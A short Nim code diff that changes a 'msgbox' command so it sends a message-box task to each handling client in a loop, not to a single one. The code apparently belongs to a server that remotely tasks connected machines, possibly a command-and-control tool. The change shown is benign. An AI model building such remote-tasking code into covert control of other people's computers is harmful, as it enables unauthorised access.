@@ -8,8 +8,9 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   if len(args) < 2:
     errorLog "you must specify a title and caption for the message box, see 'help msgbox'"
     return
-
-  discard await msgbox.sendTask(server.cli.handlingClient, args[1], args[0])
+  
+  for client in server.cli.handlingClient:
+    discard await msgbox.sendTask(client, args[1], args[0])
 
 let cmd*: Command = Command(
   execProc: execProc,
